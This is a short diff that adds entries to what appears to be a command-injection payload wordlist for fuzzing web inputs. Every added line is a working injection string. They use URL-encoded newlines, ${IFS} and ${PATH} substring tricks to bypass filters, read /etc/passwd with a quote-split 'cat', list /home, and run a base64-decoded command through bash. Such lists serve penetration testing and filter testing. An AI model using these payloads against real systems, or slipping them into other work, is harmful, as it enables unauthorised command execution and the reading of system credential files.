@@ -88,3 +88,8 @@ ${LS_COLORS:10:1}${IFS}id
 %257c%257c
 %2560%2560
 %2524%2528%2529
+%0a{ls,-la}
+${LS_COLORS:10:1}${IFS}
+%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+%0als${IFS}${PATH:0:1}home
+%0abash<<<$(base64${IFS}-d<<<bHMgLWxh)
